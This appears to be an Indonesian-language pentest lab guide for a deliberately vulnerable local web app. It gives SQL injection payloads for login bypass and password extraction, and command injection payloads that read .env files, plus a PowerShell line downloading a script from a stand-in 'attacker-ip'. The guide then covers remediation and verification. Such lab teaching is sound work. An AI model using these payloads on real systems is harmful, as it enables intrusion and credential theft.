# Panduan Penetration Testing - PentesCuy
## SQL Injection & Command Injection

---

## 📋 Daftar Isi

1. [Target Creation](#1-target-creation)
2. [Enumeration](#2-enumeration)
3. [Exploitation](#3-exploitation)
   - [SQL Injection](#31-sql-injection)
   - [Command Injection](#32-command-injection)
4. [Remediation](#4-remediation)
5. [Proof](#5-proof)

---

## 1. Target Creation

### 1.1 Deskripsi Target

**PentesCuy** adalah web application yang dibuat dengan:
- **Frontend**: React + Vite + Tailwind CSS
- **Backend**: Node.js + Express
- **Database**: Supabase (PostgreSQL)

**Fitur yang Vulnerable:**
1. **Login System** - SQL Injection di authentication
2. **User Search** - SQL Injection di search query
3. **Ping Tool** - Command Injection di network utility
4. **System Info** - Command Injection di system commands

### 1.2 Setup Target

```bash
# Clone atau navigate ke folder project
cd vulnerable-webapp

# Install dependencies
npm install

# Setup .env file dengan Supabase credentials
# (lihat SUPABASE_SETUP.md untuk detail)

# Jalankan backend server
npm run server

# Di terminal terpisah, jalankan frontend
npm run dev
```

**URL Target:**
- Frontend: `http://localhost:5173`
- Backend API: `http://localhost:3001`

---

## 2. Enumeration

### 2.1 Information Gathering

#### A. Port Scanning

```bash
# Scan port yang terbuka
nmap -p 3001,5173 localhost

# Output expected:
# PORT     STATE SERVICE
# 3001/tcp open  express-api
# 5173/tcp open  vite-dev
```

#### B. Technology Stack Detection

**Tools yang bisa digunakan:**
- Browser DevTools (F12)
- Wappalyzer extension
- Manual inspection

**Yang ditemukan:**
```
Frontend:
- Framework: React 19.x
- Build Tool: Vite 7.x
- Styling: Tailwind CSS
- HTTP Client: Axios

Backend:
- Runtime: Node.js
- Framework: Express.js
- Database: PostgreSQL (via Supabase)
- CORS: Enabled (vulnerable)
```

#### C. Endpoint Discovery

**Metode 1: Inspect Network Tab**
1. Buka DevTools (F12)
2. Tab Network
3. Interact dengan aplikasi
4. Observe API calls

**Metode 2: Check Source Code (jika tersedia)**
```bash
# Search for API endpoints
grep -r "api/" src/
```

**Endpoints yang ditemukan:**

| Method | Endpoint | Purpose | Vulnerable |
|--------|----------|---------|------------|
| POST | /api/login | Authentication | ✅ SQL Injection |
| GET | /api/search | User search | ✅ SQL Injection |
| POST | /api/ping | Ping utility | ✅ Command Injection |
| POST | /api/system-info | System info | ✅ Command Injection |
| POST | /api/secure/login | Secure auth | ❌ Protected |
| GET | /api/secure/search | Secure search | ❌ Protected |
| POST | /api/secure/ping | Secure ping | ❌ Protected |
| POST | /api/secure/system-info | Secure info | ❌ Protected |

#### D. Database Schema Discovery

**Menggunakan SQL Injection untuk enumerate:**

```sql
-- Di User Search field, inject:
' UNION SELECT table_name, column_name, null, null FROM information_schema.columns--

-- Atau untuk PostgreSQL:
' UNION SELECT table_name::text, column_name::text, data_type::text, null FROM information_schema.columns WHERE table_schema='public'--
```

**Expected Output:**
- Table: `users`
- Columns: `id`, `username`, `email`, `password`, `role`, `created_at`

---

## 3. Exploitation

### 3.1 SQL Injection

#### 3.1.1 SQL Injection di Login Form

**Target:** `POST /api/login`

**Vulnerable Code:**
```javascript
const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
```

**Exploitation Steps:**

**Attack 1: Authentication Bypass**

1. Buka halaman Login
2. Di field **Username**, masukkan: `' OR '1'='1`
3. Di field **Password**, masukkan: `anything`
4. Klik Login

**Payload:**
```
Username: ' OR '1'='1
Password: anything
```

**Query yang dieksekusi:**
```sql
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = 'anything'
```

**Hasil:** Login berhasil tanpa kredensial valid! ✅

**Why it works:**
- `'1'='1'` selalu TRUE
- Karena OR operator, kondisi keseluruhan menjadi TRUE
- Returns first user (biasanya admin)

---

**Attack 2: Extract Specific User**

**Payload:**
```
Username: admin'--
Password: (kosong/anything)
```

**Query yang dieksekusi:**
```sql
SELECT * FROM users WHERE username = 'admin'-- AND password = ''
```

**Hasil:** Login sebagai admin! `--` meng-comment bagian password check.

---

**Attack 3: UNION-based SQL Injection**

**Payload di Username field:**
```sql
' UNION SELECT id, username, password, email, role FROM users WHERE '1'='1
```

**Hasil:** Bisa mendapatkan data semua user dengan passwords mereka!

---

#### 3.1.2 SQL Injection di User Search

**Target:** `GET /api/search?query=`

**Vulnerable Code:**
```javascript
const sqlQuery = `SELECT id, username, email, role FROM users WHERE username LIKE '%${query}%' OR email LIKE '%${query}%'`;
```

**Exploitation Steps:**

**Attack 1: Extract All Users**

1. Buka User Search
2. Masukkan: `%' OR '1'='1`

**Query yang dieksekusi:**
```sql
SELECT id, username, email, role FROM users WHERE username LIKE '%%' OR '1'='1%' OR email LIKE '%%' OR '1'='1%'
```

**Hasil:** Menampilkan semua user! ✅

---

**Attack 2: Extract Passwords (UNION Injection)**

**Payload:**
```sql
' UNION SELECT id, username, email, password FROM users--
```

**Query yang dieksekusi:**
```sql
SELECT id, username, email, role FROM users WHERE username LIKE '%' UNION SELECT id, username, email, password FROM users--%' OR email LIKE '%%' OR '1'='1%'
```

**Hasil:** Password semua user ter-expose! 🔓

---

**Attack 3: Database Enumeration**

**Get table names:**
```sql
' UNION SELECT null, table_name, null, null FROM information_schema.tables WHERE table_schema='public'--
```

**Get column names:**
```sql
' UNION SELECT null, column_name, data_type, null FROM information_schema.columns WHERE table_name='users'--
```

**Get current database user:**
```sql
' UNION SELECT null, current_user, current_database(), null--
```

---

### 3.2 Command Injection

#### 3.2.1 Command Injection di Ping Tool

**Target:** `POST /api/ping`

**Vulnerable Code:**
```javascript
const command = `ping -n 4 ${host}`;
exec(command, (error, stdout, stderr) => { ... });
```

**Exploitation Steps:**

**Attack 1: Command Chaining with &**

1. Buka System Tools → Ping Tool
2. Masukkan: `google.com & whoami`

**Command yang dieksekusi:**
```bash
ping -n 4 google.com & whoami
```

**Hasil:** 
- Ping dijalankan
- Command `whoami` juga dieksekusi! ✅
- Output menampilkan username system

---

**Attack 2: Command Chaining with &&**

**Payload:**
```
google.com && dir
```

**Command yang dieksekusi:**
```bash
ping -n 4 google.com && dir
```

**Hasil:** Listing directory! 📁

---

**Attack 3: Command Substitution**

**Payload Windows:**
```
google.com & ipconfig
```

**Hasil:** Network configuration ter-expose!

**Payload untuk get environment variables:**
```
google.com & set
```

**Hasil:** Semua environment variables ditampilkan! (termasuk potentially sensitive data)

---

**Attack 4: Reverse Shell (Advanced)**

⚠️ **Warning: Gunakan dengan hati-hati, hanya di environment test!**

**Payload Windows PowerShell:**
```
google.com & powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker-ip/shell.ps1')"
```

---

#### 3.2.2 Command Injection di System Info

**Target:** `POST /api/system-info`

**Vulnerable Code:**
```javascript
const systemCommand = `systeminfo | findstr /C:"${command}"`;
exec(systemCommand, (error, stdout, stderr) => { ... });
```

**Exploitation Steps:**

**Attack 1: Escape findstr**

**Payload:**
```
" & whoami & echo "
```

**Command yang dieksekusi:**
```bash
systeminfo | findstr /C:"" & whoami & echo ""
```

**Hasil:** `whoami` command executed! ✅

---

**Attack 2: List Files**

**Payload:**
```
" & dir C:\ & echo "
```

**Hasil:** Directory listing dari C drive!

---

**Attack 3: Read Sensitive Files**

**Payload:**
```
" & type .env & echo "
```

**Hasil:** Environment variables dan credentials ter-expose! 🔑

---

**Attack 4: Network Reconnaissance**

**Payload:**
```
" & ipconfig /all & echo "
```

**Hasil:** Full network configuration!

**Payload:**
```
" & netstat -ano & echo "
```

**Hasil:** All active connections and listening ports!

---

### 3.3 Impact Assessment

**SQL Injection Impact:**
- ✅ Authentication Bypass
- ✅ Data Breach (user credentials)
- ✅ Data Exfiltration
- ✅ Database Enumeration
- ❌ Potential: Data Manipulation (INSERT, UPDATE, DELETE)
- ❌ Potential: Privilege Escalation

**Command Injection Impact:**
- ✅ Remote Code Execution (RCE)
- ✅ System Information Disclosure
- ✅ File System Access
- ✅ Network Reconnaissance
- ❌ Potential: Complete System Compromise
- ❌ Potential: Lateral Movement
- ❌ Potential: Data Destruction

**CVSS Score Estimation:**
- SQL Injection: **9.8** (Critical)
- Command Injection: **10.0** (Critical)

---

## 4. Remediation

### 4.1 SQL Injection Fixes

#### Fix 1: Use Parameterized Queries (Prepared Statements)

**❌ Vulnerable Code:**
```javascript
const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
```

**✅ Secure Code:**
```javascript
const { data, error } = await supabase
  .from('users')
  .select('*')
  .eq('username', username)
  .eq('password', password)
  .single();
```

**Why it's secure:**
- Query builder automatically escapes input
- Parameters are sent separately from query
- No string concatenation

---

#### Fix 2: Input Validation

```javascript
function validateUsername(username) {
  // Only allow alphanumeric and underscore
  const regex = /^[a-zA-Z0-9_]{3,20}$/;
  if (!regex.test(username)) {
    throw new Error('Invalid username format');
  }
  return username;
}

// Usage:
const cleanUsername = validateUsername(username);
```

---

#### Fix 3: Use ORM/Query Builder

**✅ Secure Search Implementation:**
```javascript
const { data, error } = await supabase
  .from('users')
  .select('id, username, email, role')
  .or(`username.ilike.%${query}%,email.ilike.%${query}%`);
```

---

#### Fix 4: Principle of Least Privilege

```sql
-- Create read-only user for application
CREATE ROLE app_user WITH LOGIN PASSWORD 'secure_password';

-- Grant only SELECT on specific columns
GRANT SELECT (id, username, email, role) ON users TO app_user;

-- Revoke dangerous permissions
REVOKE ALL ON information_schema.tables FROM app_user;
REVOKE ALL ON information_schema.columns FROM app_user;
```

---

### 4.2 Command Injection Fixes

#### Fix 1: Input Validation dengan Whitelist

**❌ Vulnerable Code:**
```javascript
const command = `ping -n 4 ${host}`;
exec(command, callback);
```

**✅ Secure Code:**
```javascript
// Validate input: only allow valid IP or domain
const ipRegex = /^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
const domainRegex = /^[a-zA-Z0-9][a-zA-Z0-9-]{1,61}[a-zA-Z0-9]\.[a-zA-Z]{2,}$/;

if (!ipRegex.test(host) && !domainRegex.test(host)) {
  return res.status(400).json({ 
    error: 'Invalid host format' 
  });
}

// Use array syntax for exec (prevents shell interpretation)
const command = ['ping', '-n', '4', host];
execFile('ping', ['-n', '4', host], callback);
```

**Why it's secure:**
- Strict input validation
- `execFile` instead of `exec` (no shell interpretation)
- Arguments passed as array (not string)

---

#### Fix 2: Use Whitelist Approach

**✅ Secure System Info:**
```javascript
const allowedCommands = {
  'os': 'systeminfo | findstr /C:"OS Name"',
  'processor': 'systeminfo | findstr /C:"Processor"',
  'memory': 'systeminfo | findstr /C:"Total Physical Memory"',
  'hostname': 'hostname'
};

const command = allowedCommands[infoType];

if (!command) {
  return res.status(400).json({ 
    error: 'Invalid info type' 
  });
}

exec(command, callback);
```

**Why it's secure:**
- No user input in command
- Predefined command list
- Command selection only (not construction)

---

#### Fix 3: Sanitize Input

```javascript
function sanitizeHost(host) {
  // Remove dangerous characters
  return host.replace(/[;&|`$(){}[\]<>\\]/g, '');
}

// Better: validate instead of sanitize
function validateHost(host) {
  const dangerous = /[;&|`$(){}[\]<>\\]/;
  if (dangerous.test(host)) {
    throw new Error('Invalid characters in host');
  }
  return host;
}
```

---

#### Fix 4: Use Dedicated Libraries

```javascript
// Install: npm install ping
const ping = require('ping');

// Secure ping implementation
async function securePing(host) {
  try {
    const res = await ping.promise.probe(host, {
      timeout: 10,
      min_reply: 4
    });
    return res;
  } catch (error) {
    throw error;
  }
}
```

---

### 4.3 General Security Best Practices

#### A. Enable Content Security Policy (CSP)

```javascript
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self'"
  );
  next();
});
```

#### B. Rate Limiting

```javascript
const rateLimit = require('express-rate-limit');

const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100 // limit each IP to 100 requests per windowMs
});

app.use('/api/', limiter);
```

#### C. Input Length Limits

```javascript
app.use(express.json({ limit: '10kb' }));
app.use(express.urlencoded({ extended: true, limit: '10kb' }));
```

#### D. Security Headers

```javascript
const helmet = require('helmet');
app.use(helmet());
```

#### E. Error Handling (Don't Expose Stack Traces)

```javascript
app.use((err, req, res, next) => {
  // Log error internally
  console.error(err);
  
  // Send generic error to client
  res.status(500).json({ 
    error: 'Internal server error' 
  });
});
```

---

## 5. Proof

### 5.1 Testing Vulnerable Mode

**SQL Injection Test:**
1. Switch ke "Vulnerable Mode"
2. Test Login dengan payload: `' OR '1'='1`
3. **Expected:** ✅ Login berhasil (bypass)
4. Test User Search dengan: `' UNION SELECT id, username, email, password FROM users--`
5. **Expected:** ✅ Passwords ter-expose

**Command Injection Test:**
1. Test Ping dengan: `google.com & whoami`
2. **Expected:** ✅ Command executed
3. Test System Info dengan: `" & dir & echo "`
4. **Expected:** ✅ Directory listing displayed

---

### 5.2 Testing Secure Mode

**SQL Injection Test:**
1. Switch ke "Secure Mode"
2. Test Login dengan payload: `' OR '1'='1`
3. **Expected:** ❌ Login gagal (invalid credentials)
4. Test User Search dengan: `' UNION SELECT id, username, email, password FROM users--`
5. **Expected:** ❌ No data leaked / error atau empty result

**Command Injection Test:**
1. Test Ping dengan: `google.com & whoami`
2. **Expected:** ❌ Error "Invalid host format"
3. Test System Info dengan dropdown selection
4. **Expected:** ❌ Cannot inject, hanya bisa pilih predefined options

---

### 5.3 Comparison Screenshots

**Evidence yang harus didokumentasikan:**

| Test Case | Vulnerable Mode | Secure Mode |
|-----------|-----------------|-------------|
| SQL Injection Login | ✅ Bypass successful | ❌ Authentication required |
| SQL Injection Search | ✅ Data exfiltration | ❌ No data leaked |
| Command Injection Ping | ✅ RCE achieved | ❌ Input validation blocks |
| Command Injection Info | ✅ Arbitrary commands | ❌ Whitelist restriction |

---

### 5.4 Automated Testing Script

**SQL Injection Test Script:**
```bash
# Test vulnerable endpoint
curl -X POST http://localhost:3001/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"'"'"' OR '"'"'1'"'"'='"'"'1","password":"anything"}'

# Expected: HTTP 200 with user data

# Test secure endpoint
curl -X POST http://localhost:3001/api/secure/login \
  -H "Content-Type: application/json" \
  -d '{"username":"'"'"' OR '"'"'1'"'"'='"'"'1","password":"anything"}'

# Expected: HTTP 401 Unauthorized
```

**Command Injection Test Script:**
```bash
# Test vulnerable endpoint
curl -X POST http://localhost:3001/api/ping \
  -H "Content-Type: application/json" \
  -d '{"host":"google.com & whoami"}'

# Expected: whoami output in response

# Test secure endpoint
curl -X POST http://localhost:3001/api/secure/ping \
  -H "Content-Type: application/json" \
  -d '{"host":"google.com & whoami"}'

# Expected: HTTP 400 Invalid host
```

---

## 📊 Summary

### Vulnerabilities Found:
- ✅ SQL Injection in Login (CVSS 9.8)
- ✅ SQL Injection in Search (CVSS 9.8)
- ✅ Command Injection in Ping (CVSS 10.0)
- ✅ Command Injection in System Info (CVSS 10.0)

### Remediation Applied:
- ✅ Parameterized queries
- ✅ Input validation
- ✅ Whitelist approach
- ✅ Safe command execution

### Proof of Remediation:
- ✅ All attacks blocked in Secure Mode
- ✅ No data leakage
- ✅ No command execution
- ✅ Proper error handling

---

## 🎓 Learning Outcomes

Setelah menyelesaikan penetration testing ini, Anda telah belajar:

1. **Cara mengidentifikasi** vulnerability melalui enumeration
2. **Cara mengeksploitasi** SQL Injection dan Command Injection
3. **Dampak real** dari vulnerability tersebut
4. **Cara melakukan remediation** dengan best practices
5. **Cara memverifikasi** bahwa remediation berhasil

**Remember:** Gunakan pengetahuan ini secara etis dan hanya pada sistem yang Anda miliki atau dengan izin eksplisit!

---

## 📚 References

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- [CWE-78: Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [CVSS Calculator](https://www.first.org/cvss/calculator/3.1)
